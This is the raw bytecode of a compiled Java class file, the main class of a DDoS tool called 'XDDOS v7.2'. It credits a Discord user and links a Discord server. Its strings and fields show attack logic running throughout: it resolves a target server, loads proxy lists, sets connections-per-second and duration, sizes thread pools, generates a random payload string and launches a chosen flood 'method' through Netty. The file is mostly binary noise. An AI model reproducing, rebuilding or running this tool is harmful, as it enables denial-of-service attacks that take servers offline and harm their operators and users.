Êþº¾   7  XD/XDDOS/XDDOS  java/lang/Object 	proxyFile Ljava/io/File; origIP Ljava/lang/String; 	srvRecord resolved Ljava/net/InetAddress; port I 	protcolID protocolLength methodID method LXD/XDDOS/methods/IMethod; duration 	targetCPS nettyThreads loopThreads string proxies "LXD/XDDOS/utils/proxy/ProxyLoader; 	cpuselect serverhp DISCORD_USERNAME ConstantValue  CatOnDrugs#1521 attackRunning Z RED_BOLD $ [1;31m 
GREEN_BOLD ' [1;32m PURPLE_BOLD * [1;35m 
WHITE_BOLD - [1;37m RESET 0 [0m 	CYAN_BOLD 3 [1;36m <clinit> ()V Code	  8   ! LineNumberTable LocalVariableTable <init>
  = ; 5 this LXD/XDDOS/XDDOS; main ([Ljava/lang/String;)V 
Exceptions D java/lang/Throwable F file.encoding H UTF-8
 J L K java/lang/System M N setProperty 8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;	 J P Q R out Ljava/io/PrintStream;
 T V U java/io/PrintStream W 5 println YQ[1;37mâââ  ââââââââââ âââââââ  âââââââ ââââââââ
âââââââââââââââââââââââââââââââââââââââââ
 ââââââ âââ  ââââââ  ââââââ   âââââââââââ
 ââââââ âââ  ââââââ  ââââââ   âââââââââââ
ââââ ââââââââââââââââââââââââââââââââââââ
âââ  ââââââââââ âââââââ  âââââââ ââââââââ
 v7.2
[1;31mMADE BY: [1;37mCatOnDrugs#1521
[1;37m> [1;35mDISCORD: [1;32mhttp://discord.io/XDDOS
[1;37m> [1;37mStarting XDDOS :-
[0m
[1;32mSTARTING
[0m
 T [ W \ (Ljava/lang/String;)V
 ^ ` _  XD/XDDOS/utils/helper/ArgsHelper a A 
UserFrndly
 ^ c d A OneLine args [Ljava/lang/String; StackMapTable run j :[1;32m[[1;31mXDDOS[1;32m][1;37m Resolving Target IP...	  l  
 n p o #XD/XDDOS/utils/helper/ServerAddress q r 	getAddrss 9(Ljava/lang/String;)LXD/XDDOS/utils/helper/ServerAddress;
 n t u v getIP ()Ljava/lang/String;	  x 	 
 n z { | getPort ()I	  ~  
    java/net/InetAddress   	getByName *(Ljava/lang/String;)Ljava/net/InetAddress;	   
   java/lang/StringBuilder  +[1;32m[[1;37mResolved IP:[1;32m][1;37m 
   ; \
    v getHostAddress
     append -(Ljava/lang/String;)Ljava/lang/StringBuilder;  

    v toString  :
    java/lang/String    split '(Ljava/lang/String;)[Ljava/lang/String;	  ¢  	  ¤  @Y      @I      @³     
 ¬ ® ­ java/lang/Math ¯ ° ceil (D)D	  ²  ?Døµãhñ	  ¶  >ôø'I	  º  	  ¼  	  ¾   À nettyThreads: 
  Â  Ã (I)Ljava/lang/StringBuilder; Å 
loopThreads:  Ç java/util/Random
 Æ =	  Ê  
  Ì Í Î valueOf &(Ljava/lang/Object;)Ljava/lang/String;
 Æ Ð Ñ Ò nextInt (I)I
  Ô  Õ (C)Ljava/lang/StringBuilder;   
 Ø Ú Ù java/lang/Exception Û 5 printStackTrace      
 ß á à java/lang/Thread â ã sleep (J)V
 å ç æ XD/XDDOS/methods/Methods è 5 setupMethods	  ê  
 å ì í î 	getMethod .(Ljava/lang/String;)LXD/XDDOS/methods/IMethod;	  ð   ò .[1;32m[[1;37mRunning Method:[1;32m][1;37m 
   õ @
 ÷ ù ø XD/XDDOS/utils/NettyBootstrap ú 5 start sa %LXD/XDDOS/utils/helper/ServerAddress; r Ljava/util/Random; i var4 Ljava/lang/Exception; 
SourceFile 
XDDOS.java !      	     	     	 	    	 
    	     	     	     	     	     	     	     	     	     	     	     	     	              	   !    "       #  %       &  (       )  +       ,  .       /  1       2   4 5  6   )      ³ 7±    9   
    "  ) :       ; 5  6   /     *· <±    9        :        > ?   	 @ A  B     C 6        /EG¸ IW² O¶ S² O¶ S² OX¶ Z*¾ 
*¸ ]§ *¸ b±    9   & 	   ,  -  .  /  < # = ' > * @ . B :       / e f   g    * 	 h 5  B     C 6  G 	   m² 7i³ 7² Oi¶ Z² k¸ mK*¶ s³ w*¶ y³ }² w¸ ³ ² O» Y· ² ¶ ¶ ¶ /¶ ¶ ¶ Z² k¶ 2³ ¡² £² £ ¥o §² £ ©ock¸ «`³ ±² ±  	 §  ³² ±k¸ «³ µ² ±  §  ·² ±k¸ «³ ¹² » ¤ § ³ ½² O» Y¿· ² µ¶ ÁÄ¶ ² ¹¶ Á¶ ¶ Z» ÆY· ÈL=§ &² É» Z_¸ Ë· +}¶ Ï`¶ Ó¶ ³ ÉÖ¡ÿÚ§ K*¶ × Ü¸ Þ±¸ ä² é¸ ë³ ï² O» Yñ· ² ï¶ óô¶ 2¶ ¶ /¶ ¶ ¶ Z¸ ö±  
"% Ø  9   f    E  F 
 H  I  J   K ' L 0 M U N b O  P  Q ¸ R É S ì T ô W" Y& Z* [0 \1 _4 `= ai cl e :   *  	 û ü   ô . ý þ  ö , ÿ  &     g   $ ü  nKK@ý 2 Æ"ÿ     Ø:    